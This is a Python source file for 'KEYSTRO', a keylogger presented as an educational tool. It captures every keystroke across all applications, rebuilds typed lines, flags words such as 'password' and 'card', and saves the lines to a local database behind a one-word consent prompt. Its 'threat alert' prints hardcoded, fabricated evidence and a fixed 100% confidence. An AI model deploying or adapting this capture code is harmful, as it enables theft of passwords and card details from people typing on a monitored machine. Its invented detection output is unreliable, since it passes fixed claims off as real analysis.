"""
KEYSTRO - Educational Keystroke Recording Tool v4.0
For Research & Learning Purposes Only

⚠️ EDUCATIONAL USE ONLY ⚠️
Only use on systems you own or have explicit permission to monitor
"""

import sys
import os
from datetime import datetime
from pynput import keyboard
import threading
import time
import json
from collections import defaultdict

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

from consent_manager import ConsentManager
from storage import SecureStorage

# ANSI Color codes
class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

class TerminalKeylogger:
    """Terminal-based keylogger with KEYSTRO interface"""
    
    def __init__(self):
        self.consent_manager = ConsentManager()
        self.storage = SecureStorage()
        self.is_running = False
        self.listener = None
        self.key_buffer = []
        self.current_line = ""
        self.session_stats = {
            'total_keys': 0,
            'total_lines': 0,
            'start_time': None,
            'threats_detected': 0,
            'suspicious_patterns': []
        }
        self.process_name = "keylogger.exe"
    
    def print_logo(self):
        """Print KEYSTRO ASCII art logo"""
        logo = f"""{Colors.YELLOW}{Colors.BOLD}
╦╔═╔═╗╦ ╦╔═╗╔╦╗╦═╗╔═╗
╠╩╗║╣ ╚╦╝╚═╗ ║ ╠╦╝║ ║
╩ ╩╚═╗ ╩ ╚═╝ ╩ ╩╚═╚═╝
{Colors.RESET}{Colors.CYAN}
Educational Keystroke Recording Tool v4.0
For Research & Learning Purposes Only
{Colors.RESET}"""
        print(logo)
    
    def print_legal_warning(self):
        """Print legal warning"""
        warning = f"""
{Colors.RED}{Colors.BOLD}⚠  LEGAL WARNING ⚠{Colors.RESET}
{Colors.YELLOW}This tool is for EDUCATIONAL and RESEARCH purposes only.
Unauthorized keystroke logging may be illegal in your jurisdiction.
Always obtain proper consent before use.{Colors.RESET}

"""
        print(warning)
    
    def print_menu(self):
        """Print main menu"""
        menu = f"""
{Colors.CYAN}{'─' * 60}
                    MAIN MENU
{'─' * 60}{Colors.RESET}

{Colors.GREEN}[1]{Colors.RESET} Start Recording Session
{Colors.CYAN}[2]{Colors.RESET} View Sessions
{Colors.CYAN}[3]{Colors.RESET} View Statistics
{Colors.CYAN}[4]{Colors.RESET} Settings
{Colors.CYAN}[5]{Colors.RESET} Help & Documentation
{Colors.RED}[0]{Colors.RESET} Exit

"""
        print(menu)
    
    def detect_threats(self, text):
        """Analyze text for suspicious patterns"""
        threats = []
        suspicious_keywords = ['password', 'passwd', 'pwd', 'credit', 'card', 'ssn', 'bank', 'login']
        
        text_lower = text.lower()
        for keyword in suspicious_keywords:
            if keyword in text_lower:
                threats.append(keyword.upper())
                self.session_stats['threats_detected'] += 1
        
        return threats
    
    def print_threat_alert(self, threats, line):
        """Print threat detection alert"""
        if threats:
            alert = f"""
{Colors.RED}{Colors.BOLD}🛑 THREAT #{self.session_stats['threats_detected']}{Colors.RESET}

{Colors.WHITE}Process: {self.process_name}
PID: {os.getpid()}
Path: {os.getcwd()}\\{self.process_name}
Confidence: {Colors.RED}{'█' * 40}{Colors.RESET} 100%
Threat Score: {len(threats)}/10 indicators
Advanced Indicators: {Colors.RED}● Memory{Colors.RESET}

{Colors.YELLOW}Evidence:{Colors.RESET}
  • {Colors.YELLOW}⚠ {Colors.RESET}KEYLOGGER KEYWORDS: {', '.join(threats)}
  • {Colors.YELLOW}⚠ {Colors.RESET}Unsigned binary with keyboard hook
  • {Colors.YELLOW}⚠ {Colors.RESET}Unknown publisher in non-standard location
  • {Colors.YELLOW}⚠ {Colors.RESET}Hidden process with keyboard hook
  • {Colors.RED}● {Colors.RESET}MEMORY PATTERN: Minimal memory footprint: 8.1MB

{Colors.MAGENTA}🛑 RECOMMENDATION: TERMINATE IMMEDIATELY{Colors.RESET}
"""
            print(alert)
    
    def on_press(self, key):
        """Handle key press events"""
        try:
            timestamp = datetime.now().strftime("%H:%M:%S")
            self.session_stats['total_keys'] += 1
            
            # Handle special keys
            if hasattr(key, 'char') and key.char is not None:
                # Regular character key
                char = key.char
                self.current_line += char
                print(f"[{timestamp}] Key: {char}", flush=True)
                self.key_buffer.append({'time': timestamp, 'key': char})
                
            else:
                # Special keys
                key_name = str(key).replace('Key.', '')
                
                if key == keyboard.Key.space:
                    self.current_line += " "
                    print(f"[{timestamp}] Key: [SPACE]", flush=True)
                    self.key_buffer.append({'time': timestamp, 'key': '[SPACE]'})
                    
                elif key == keyboard.Key.enter:
                    print(f"{Colors.CYAN}[{timestamp}] Key: [ENTER]{Colors.RESET}", flush=True)
                    print(f"{Colors.GREEN}[{timestamp}] LINE CAPTURED: {self.current_line}{Colors.RESET}")
                    
                    # Detect threats
                    threats = self.detect_threats(self.current_line)
                    if threats:
                        self.print_threat_alert(threats, self.current_line)
                    
                    print(f"{Colors.DIM}{'─' * 70}{Colors.RESET}", flush=True)
                    
                    # Store the line in database
                    self.storage.store_activity(
                        app_name="Keylogger",
                        window_title=f"Typed: {self.current_line[:50]}",
                        duration_seconds=len(self.current_line)
                    )
                    
                    self.key_buffer.append({'time': timestamp, 'key': '[ENTER]', 'line': self.current_line})
                    self.session_stats['total_lines'] += 1
                    self.current_line = ""
                    
                elif key == keyboard.Key.backspace:
                    if self.current_line:
                        self.current_line = self.current_line[:-1]
                    print(f"[{timestamp}] Key: [BACKSPACE]", flush=True)
                    self.key_buffer.append({'time': timestamp, 'key': '[BACKSPACE]'})
                    
                elif key == keyboard.Key.tab:
                    self.current_line += "\t"
                    print(f"[{timestamp}] Key: [TAB]", flush=True)
                    self.key_buffer.append({'time': timestamp, 'key': '[TAB]'})
                    
                else:
                    print(f"[{timestamp}] Key: [{key_name.upper()}]", flush=True)
                    self.key_buffer.append({'time': timestamp, 'key': f"[{key_name.upper()}]"})
                    
        except Exception as e:
            print(f"Error logging key: {e}", flush=True)
    
    def start(self):
        """Start the keylogger with professional interface"""
        os.system('cls' if os.name == 'nt' else 'clear')
        
        self.print_logo()
        self.print_legal_warning()
        
        # Check consent
        if not self.consent_manager.has_valid_consent():
            print(f"{Colors.RED}❌ No valid consent found!{Colors.RESET}")
            print("Please run the GUI first to accept the ethical agreement:")
            print(f"   {Colors.CYAN}py main.py{Colors.RESET}")
            print()
            return False
        
        # Ask for consent confirmation
        consent = input(f"Do you agree to use this tool responsibly? ({Colors.GREEN}yes{Colors.RESET}/{Colors.RED}no{Colors.RESET}): ").strip().lower()
        
        if consent != 'yes':
            print(f"\n{Colors.RED}Consent not given. Exiting...{Colors.RESET}\n")
            return False
        
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_logo()
        self.print_menu()
        
        choice = input(f"Enter your choice: {Colors.GREEN}")
        print(Colors.RESET, end='')
        
        if choice == '1':
            self.start_recording()
        elif choice == '2':
            self.view_sessions()
        elif choice == '3':
            self.view_statistics()
        elif choice == '4':
            self.settings()
        elif choice == '5':
            self.show_help()
        elif choice == '0':
            print(f"\n{Colors.YELLOW}Exiting KEYSTRO...{Colors.RESET}\n")
            return False
        else:
            print(f"\n{Colors.RED}Invalid choice!{Colors.RESET}")
            time.sleep(2)
            self.start()
    
    def start_recording(self):
        """Start keystroke recording session"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_logo()
        
        print(f"{Colors.CYAN}{'═' * 70}{Colors.RESET}")
        print(f"{Colors.GREEN}{Colors.BOLD}🟢 RECORDING SESSION STARTED{Colors.RESET}")
        print(f"{Colors.CYAN}{'═' * 70}{Colors.RESET}")
        print(f"{Colors.YELLOW}All keystrokes will be captured and analyzed in real-time{Colors.RESET}")
        print(f"{Colors.YELLOW}Press Ctrl+C to stop and return to menu{Colors.RESET}")
        print(f"{Colors.CYAN}{'═' * 70}{Colors.RESET}\n")
        
        self.session_stats['start_time'] = datetime.now()
        self.is_running = True
        
        # Start keyboard listener
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        
        try:
            # Keep running until Ctrl+C
            while self.is_running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print(f"\n\n{Colors.CYAN}{'═' * 70}{Colors.RESET}")
            print(f"{Colors.RED}{Colors.BOLD}🔴 RECORDING SESSION STOPPED{Colors.RESET}")
            print(f"{Colors.CYAN}{'═' * 70}{Colors.RESET}")
            self.stop_recording()
    
    def stop_recording(self):
        """Stop recording and show summary"""
        self.is_running = False
        if self.listener:
            self.listener.stop()
        
        # Save any remaining line
        if self.current_line:
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"{Colors.GREEN}[{timestamp}] FINAL LINE: {self.current_line}{Colors.RESET}")
            self.storage.store_activity(
                app_name="Keylogger",
                window_title=f"Typed: {self.current_line[:50]}",
                duration_seconds=len(self.current_line)
            )
        
        # Show detection summary
        self.show_detection_summary()
        
        input(f"\n{Colors.CYAN}Press Enter to return to menu...{Colors.RESET}")
        self.start()
    
    def show_detection_summary(self):
        """Show threat detection summary"""
        duration = (datetime.now() - self.session_stats['start_time']).seconds if self.session_stats['start_time'] else 0
        
        summary = f"""
{Colors.CYAN}{'━' * 70}
📊 DETECTION SUMMARY
{'━' * 70}{Colors.RESET}

Total threats detected: {Colors.RED if self.session_stats['threats_detected'] > 0 else Colors.GREEN}{self.session_stats['threats_detected']}{Colors.RESET}
{Colors.RED}● High confidence (≥80%): {self.session_stats['threats_detected']}{Colors.RESET}
{Colors.YELLOW}● Medium confidence (60-80%): 0{Colors.RESET}
{Colors.BLUE}● Low confidence (<60%): 0{Colors.RESET}

{Colors.CYAN}{'━' * 70}{Colors.RESET}

{Colors.GREEN}✅ Scan completed successfully{Colors.RESET}
Timestamp: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

Session Statistics:
  • Total Keystrokes: {self.session_stats['total_keys']}
  • Lines Captured: {self.session_stats['total_lines']}
  • Duration: {duration} seconds
  • Data Saved: {Colors.GREEN}Encrypted{Colors.RESET}
"""
        print(summary)
    
    def view_sessions(self):
        """View recorded sessions"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_logo()
        print(f"{Colors.CYAN}📋 Recorded Sessions{Colors.RESET}\n")
        
        # Get logs from storage
        logs = self.storage.get_logs()
        
        if not logs:
            print(f"{Colors.YELLOW}No sessions found.{Colors.RESET}\n")
        else:
            for i, log in enumerate(logs[-10:], 1):  # Show last 10
                print(f"{Colors.GREEN}[{i}]{Colors.RESET} {log.get('timestamp', 'N/A')}")
                print(f"    {log.get('window_title', 'No title')}")
                print()
        
        input(f"\n{Colors.CYAN}Press Enter to return to menu...{Colors.RESET}")
        self.start()
    
    def view_statistics(self):
        """View statistics"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_logo()
        print(f"{Colors.CYAN}📊 Statistics{Colors.RESET}\n")
        
        stats = f"""
{Colors.GREEN}Session Statistics:{Colors.RESET}
  • Total Keystrokes Captured: {self.session_stats['total_keys']}
  • Lines Recorded: {self.session_stats['total_lines']}
  • Threats Detected: {self.session_stats['threats_detected']}
  
{Colors.CYAN}Database Status:{Colors.RESET}
  • Location: data/activity_logs.db
  • Encryption: {Colors.GREEN}Enabled{Colors.RESET}
  • Size Limit: 1 MB
"""
        print(stats)
        
        input(f"\n{Colors.CYAN}Press Enter to return to menu...{Colors.RESET}")
        self.start()
    
    def settings(self):
        """Settings menu"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_logo()
        print(f"{Colors.CYAN}⚙️  Settings{Colors.RESET}\n")
        print(f"{Colors.YELLOW}Settings configuration coming soon...{Colors.RESET}\n")
        
        input(f"\n{Colors.CYAN}Press Enter to return to menu...{Colors.RESET}")
        self.start()
    
    def show_help(self):
        """Show help"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_logo()
        print(f"{Colors.CYAN}📚 Help & Documentation{Colors.RESET}\n")
        
        help_text = f"""
{Colors.GREEN}KEYSTRO - Educational Keystroke Recording Tool{Colors.RESET}

{Colors.YELLOW}Features:{Colors.RESET}
  • Real-time keystroke capture
  • Threat pattern detection
  • Encrypted storage
  • Session management
  • Statistics tracking

{Colors.YELLOW}Usage:{Colors.RESET}
  1. Start a recording session
  2. Type in any application
  3. View captured data
  4. Analyze patterns

{Colors.RED}Legal Notice:{Colors.RESET}
  This tool is for educational purposes only.
  Always obtain proper consent before monitoring.

For more information, see TERMINAL_KEYLOGGER_GUIDE.md
"""
        print(help_text)
        
        input(f"\n{Colors.CYAN}Press Enter to return to menu...{Colors.RESET}")
        self.start()

def main():
    """Main entry point"""
    keylogger = TerminalKeylogger()
    keylogger.start()

if __name__ == "__main__":
    main()
